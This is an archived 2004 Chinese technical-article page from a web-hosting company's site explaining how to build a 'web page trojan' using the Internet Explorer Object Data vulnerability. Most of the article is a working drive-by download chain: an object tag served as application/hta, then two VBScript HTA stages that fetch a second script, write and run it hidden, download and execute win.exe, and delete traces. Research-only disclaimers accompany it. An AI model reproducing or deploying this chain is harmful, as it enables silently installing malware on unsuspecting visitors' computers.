
<script src="http://haihua.net/tongji/mystat.asp"></script>

<html>
<head>
<title>海华网---利用IE Object Data漏洞实现之网页木马</title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<link rel="stylesheet" href="haihua.css" type="text/css">
<script language="JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
// -->
</script>
<meta http-equiv="Content-Language" content="zh-cn">
<meta name="GENERATOR" content="Microsoft FrontPage 6.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
</head>
<body bgcolor="#FFFFFF" text="#000000" topmargin="0" leftmargin="0">
<div align="center">
  <table width="760" border="0" cellpadding="0" cellspacing="0" height="32" align="center">
    <tr> 
      <td height="60" width="145" valign="top" bgcolor="#ffd600"> 
        <table width="148" border="0" cellpadding="0" cellspacing="0" height="65">
          <tr> 
            <td height="47" valign="top"> 
              <table width="152" border="0" cellpadding="0" cellspacing="0" height="48">
                <tr> 
                  <td bgcolor="#ffd600"> 
                    <div align="center"><img src="images/logo.gif" width="136" height="48"></div>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr> 
            <td bgcolor="#ffd600" valign="middle"> 
              <div align="center" class="haihua"><font color="#CC3333"><b>吉B-2-4-20030005号</b></font></div>
            </td>
          </tr>
        </table>
      </td>
      <td height="60" width="494" valign="top"> 
        <table width="488" border="0" height="66" cellpadding="0" cellspacing="0">
          <tr> 
            <td bgcolor="#ffd600">
              <div align="center"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=5,0,0,0" width="451" height="66">
                  <param name=movie value="ad/top2.swf">
                  <param name=quality value=high>
                  <embed src="ad/top2.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="451" height="66">
                  </embed></object></div>
            </td>
          </tr>
        </table>
      </td>
      <td height="60" width="121" bgcolor="#ffd600" valign="top"> 
        <table cellspacing=0 cellpadding=0 width=120 bgcolor=#ffd600 border=0>
          <tbody> 
          <tr> 
            <td colspan=2 height=22><img height=24 src="images/sz101.gif" 
            width=120></td>
          </tr>
          <tr> 
            <td valign=top align=middle colspan=2> 
              <table cellspacing=0 cellpadding=0 border=0>
                <tbody> 
                <tr> 
                  <td width=50 height=21> 
                    <table cellspacing=0 cellpadding=0 border=0>
                      <tbody> 
                      <tr> 
                        <td width=3 height=19><img height=19 
                        src="images/sz201.gif" width=3></td>
                        <td width=42 background=images/sz202.gif class="haihua" valign="bottom"> 
                          <div align="center">收藏</div>
                        </td>
                        <td width=3 height=19><img height=19 
                        src="images/sz203.gif" 
                width=3></td>
                      </tr>
                      </tbody> 
                    </table>
                  </td>
                  <td> 
                    <table cellspacing=0 cellpadding=0 border=0>
                      <tbody> 
                      <tr> 
                        <td width=3 height=19><img height=19 
                        src="images/sz201.gif" width=3></td>
                        <td align=middle width=60 
                        background=images/sz202.gif class="haihua" valign="bottom"> 
                          <div align="center">
                            <a target="_blank" href="about.asp">关于我们</a></div>
                        </td>
                        <td width=3 height=19><img height=19 
                        src="images/sz203.gif" 
                width=3></td>
                      </tr>
                      </tbody> 
                    </table>
                  </td>
                </tr>
                <tr> 
                  <td height=19> 
                    <table cellspacing=0 cellpadding=0 border=0>
                      <tbody> 
                      <tr> 
                        <td width=3 height=19><img height=19 
                        src="images/sz201.gif" width=3></td>
                        <td align=middle width=42 
                        background=images/sz202.gif> 
                          <div align="center" class="haihua"><a href="http://www.sohu.com" target="_blank">sohu</a></div>
                        </td>
                        <td width=3 height=19><img height=19 
                        src="images/sz203.gif" 
                width=3></td>
                      </tr>
                      </tbody> 
                    </table>
                  </td>
                  <td> 
                    <table cellspacing=0 cellpadding=0 border=0>
                      <tbody> 
                      <tr> 
                        <td width=3 height=19><img height=19 
                        src="images/sz201.gif" width=3></td>
                        <td align=middle width=60 
                        background=images/sz202.gif class="haihua"> 
                          <div align="center"><a href="contact.asp">联系我们</a></div>
                        </td>
                        <td width=3 height=19><img height=19 
                        src="images/sz203.gif" 
                width=3></td>
                      </tr>
                      </tbody> 
                    </table>
                  </td>
                </tr>
                </tbody> 
              </table>
            </td>
          </tr>
          <tr bgcolor=#ffd600> 
            <td width=2 height=2><img height=2 src="images/sz102.gif" 
            width=2></td>
            <td align=right width=118><img height=2 src="images/sz103.gif" 
            width=2></td>
          </tr>
          </tbody> 
        </table>
      </td>
    </tr>
  </table>
  <table width="760" border="0" cellpadding="0" cellspacing="0" height="25" align="center">
    <tr> 
      <td height="24" bgcolor="#ffd600" width="621"> 
        <div align="center" class="haihua">| <a href="/" target="_blank">网站首页</a>    
          | <a href="ym.asp">域名注册</a> | <a href="host.asp">网站空间</a> | <a href="web.asp">网页设计</a>    
          | <a href="webpro.asp" target="_blank">网站推广</a> | <a href="zzwz.asp" target="_blank">自助网站</a>    
          | 相关产品 | <a href="soft.asp">软件下载</a> | <a href="contact.asp">联系我们</a>    
          | </div>   
      </td>
      <td height="24" bgcolor="#ffd600" width="139"> 
        <div align="center"> 
          <script language=JavaScript class="haihua">
today=new Date();
function initArray(){
this.length=initArray.arguments.length
for(var i=0;i<this.length;i++)
this[i+1]=initArray.arguments[i]  }
var d=new initArray(
"星期日",
"星期一",
"星期二",
"星期三",
"星期四",
"星期五",
"星期六");
document.write(
"<font color=#0000000 style='font-size:9pt;font-family: 宋体'> ",
today.getYear(),"年",
today.getMonth()+1,"月",
today.getDate(),"日",
d[today.getDay()+1],
"</font>" ); 
          </script>
        </div>
      </td>
    </tr>
  </table>
	<div align="center">
		<table border="0" width="760" cellspacing="1" bgcolor="#FDEED1" style="border-collapse: collapse" id="table1">
			<tr>
				<td width="150" background="images/chr4133.gif" class="haihua" height="26">
				<p align="center"><b>网文分类</b></td>
				<td width="1" rowspan="2" bgcolor="#FFFFFF">
				　</td>
			<td width="600"><font color="#CC6600"><b>
          <font size="2">&nbsp;　</font><a href="hhwwlei.asp"><font color="#CC6600" size="2">海华网文总目录&gt;&gt;&gt;</font></a></b></font></td>
			</tr>
			<tr>
				<td width="150" class="haihua" valign="top" height="40">
				<p style="line-height: 150%" align="center">・资料记录<br>・法律法规<br>・服务器类<br>・媒体技术<br>・网页技巧<br>・ASP 技术<br>・数据相关<br>・网络安全<br>・通用文章<br>・文学驿站<br>・超级爆笑<br></td>
				<td width="600" height="40">
				<div align="center">
					<table border="0" cellspacing="1" style="border-collapse: collapse" width="98%" id="table2" height="20">
						<tr>
							<td><p align="center"><b><font size="5">利用IE Object Data漏洞实现之网页木马</font></b></p></td>
						</tr>
						<tr>
							<td class = "haihua" valign="top">利用IE Object Data漏洞实现之网页木马<br>
<br>
<br>
近来IE又出了个暴大的洞，该漏洞主要是IE没有对OBJECT实际内容进行审核，而只审核了后缀名（真想不到都这年代了，微软居然还用这么这么土的方法来实现安全保护，晕@##@）。 <br>
<br>
接下来谈些简单利用，以下代码不得用于非法目的，否则后果自负！<br>
<br>
<br>
原理：<br>
<br>
一、Internet Explorer Object Data Remote Execution Vulnerability<br>
<br>
利用Internet Explorer Object Data Remote Execution Vulnerability<br>
eEye Digital Security在8月20号公布了这个漏洞，该漏洞是由于HTML中的OBJECT的DATA标签引起的。对于DATA所标记的URL，IE会根据服务器返回的HTTP头中的Content-Type来处理数据，也就是说如果HTTP头中返回的是application/hta等。那么该文件就能够执行，而不管IE的安全级别多高。<br>
<br>
------------在木马种植页面中插入如下代码-------------------<br>
<br>
<object data="http://127.0.0.1/test.test";;></object><br>
<br>
然后更改服务器的MIME映射为扩展名.test对应application/hta<br>
-------------------------------<br>
这http://127.0.0.1/test.test内容的HTA页面就会被用户IE所执行。<br>
<br>
<br>
当然上面提到的再服务器端修改MIME映射，也可以直接适用ASP、JSP等动态脚本来实现相同功能。<br>
例如：可以直接使用如下代码：<br>
<br>
------------test.htm(木马种植页面)中插入如下代码-------------------<br>
<object data="http://127.0.0.1/test.asp";;></object><br>
-------------------------------<br>
<br>
---------test.asp(木马主页面)顶部写如下代码----------------------<br>
<%response.ContentType="application/hta"%><br>
-------------------------------<br>
<br>
二、网页木马原理<br>
<br>
所谓网页木马，个人理解：就是当用户浏览某网页时，自动下载并运行某一“木马”程序，进而通过该程序实施控制。<br>
由于HTA具有本地用户权限，相当于一个APPLICATION，因此，我们就可以利用上面的漏洞来实现网页木马的基本功能。<br>
要实现网页木马功能，那么必须要解决木马的下载与运行问题，运行相信大家很容易就可以想到<object id=wsh <br>
<br>
classid=clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B></object><br>
，关键是木马的下载。<br>
<br>
文件的操作在HTA中主要可以通过fso和ADOSTREAM两个组件来实现，但是FSO比较适合操作文本文件，要实现操作二进制文件还得用到后面的这<br>
<br>
个ADOSTREAM组件，但是我们可以发现当一个在IE里面运行的HTA程序是有作用域限制的，因此无法使用ADOSTREAM来操作本地文件。所以我们必<br>
<br>
须要在本地运行一个HTA程序，而HTA正是文本文件，所以，我们只要通过FSO来操作生成一个本地的HTA，继而运行该HTA得到我们想要达到的目<br>
<br>
的。<br>
<br>
至于文件下载还会用到XMLHTTP这个组件，关于这个组件这里就不作介绍。<br>
<br>
从上面的分析，我们需要通过两个HTA来实现网页木马，一个是在IE中运行，进而尤其生成本地HTA，再通过本地HTA下载木马，并运行之。好，<br>
<br>
我们可以开工了！<br>
<br>
三、具体实现过程不作解释，代码如下：<br>
<br>
<br>
------------test.htm(木马种植页面)中插入如下代码-------------------<br>
<html><br>
<body><br>
This is a Test!<br>
If success,,your Os will download a appliction and auto run it!<br>
Of course,Os must be 2k/xp/nt/2003..... and didnt patch.<br>
<object data="http://127.0.0.1/test.asp";;></object><br>
</body><br>
-------------------------------<br>
<br>
---------test.asp(木马主页面之一：生成本地HTA)顶部写如下代码----------------------<br>
<%response.ContentType="application/hta"%><br>
<br>
<html><br>
<object id=wsh classid=clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B></object><br>
<script language="VBScript"><br>
Function HttpDoGet(url)<br>
set oReq = CreateObject("Microsoft.XMLHTTP")<br>
oReq.open "GET",url,false<br>
oReq.send<br>
If oReq.status=200 then<br>
HttpDoGet=oReq.responseTEXT<br>
SaveFile HttpDoGet,"c:\win.hta" 在C:根目录下生成HTA文件<br>
Set oReq=nothing<br>
End if<br>
End Function<br>
保存文本文件，生成本地HTA。<br>
sub SaveFile(str,fName)<br>
Dim fso, tf<br>
Set fso = CreateObject("Scripting.FileSystemObject")<br>
Set tf = fso.CreateTextFile(fName, True)<br>
tf.Write str<br>
tf.Close<br>
exewin()<br>
End sub<br>
运行函数<br>
Sub exewin()<br>
set wshshell=createobject ("wscript.shell" ) <br>
a=wshshell.run ("cmd.exe /c c:\win.hta",0) <br>
window.close <br>
End Sub<br>
得到本地HTA文件<br>
HttpDoGet("http://127.0.0.1/ism.mm";) <br>
</script><br>
</html><br>
-------------------------------<br>
<br>
<br>
---------ism.mm(木马主页面之二：本地HTA页面)顶部写如下代码----------------------<br>
<html><br>
<object id=wsh classid=clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B></object><br>
<script language="VBScript"><br>
Function HttpDoGet(url)<br>
set oReq = CreateObject("Microsoft.XMLHTTP")<br>
oReq.open "GET",url,false<br>
oReq.send<br>
If oReq.status=200 then<br>
HttpDoGet=oReq.responseBody<br>
SaveFile HttpDoGet,"c:\win.exe" 在C:根目录下生成exe文件<br>
End If<br>
Set oReq=nothing<br>
End Function<br>
保存二进制文件，在本地生成exe文件。<br>
sub SaveFile(str,fName)<br>
Set objStream = CreateObject("ADODB.Stream")<br>
objStream.Type = 1<br>
objStream.Open<br>
objstream.write str<br>
objstream.SaveToFile fName,2<br>
objstream.Close()<br>
set objstream = nothing<br>
exewin()<br>
End sub<br>
运行函数,执行已经下载的exe程序。<br>
Sub exewin()<br>
set wshshell=createobject ("wscript.shell" ) <br>
a=wshshell.run ("cmd.exe /c c:\win.exe",0) <br>
b=wshshell.run ("cmd.exe /c del c:\win.hta",0) <br>
window.close <br>
End Sub<br>
得到远程木马程序<br>
HttpDoGet "http://127.0.0.1/win.exe";<br>
<br>
</script><br>
<br>
</html><br>
-------------------------------<br>
<br>
<br>
将上述页面放在某网站目录下即可，由于采用ASP，所以需要有ASP权限，当然也用修改MIME的方法。<br>
-------------------------------<br>
-------------------------------<br>
严正申明：以上程序只用于理论研究探讨，不得用于非法目的。<br>
<p><p align="center"><font color="#CC6600" size="2">
							2004/1/31 13:25:05</font></td>
						</tr>
					</table>
				</div>
				</td>
			</tr>
		</table>
	</div>
<table height=26 cellspacing=0 cellpadding=0 width=760 align=center 
background="images/index_pic5.gif" border=0>
    <tbody> 
    <tr> 
      <td align=right width="135" class="haihua" valign="bottom"> 
        <div align="left">访问:<font color="#ff0000">
          <script language="JavaScript" src="cgi-bin/dulicnter.asp"></script>
          </font></div>
      </td>
      <td align=right width=158 class="haihua" valign="bottom"> 
        <div align="center">长春海华科技有限责任公司</div>
      </td>
      <td align=right width=457 class="haihua" valign="bottom"> 
        长春市工农大路1313号，百脑汇电脑城4楼4I24厅 电话:0431-88607080
      </td>
      <td align=right width=10 class="haihua" valign="bottom" bgcolor="#ffd600">　</td>
    </tr>
    </tbody> 
</table>  
</div>
</body>
</html>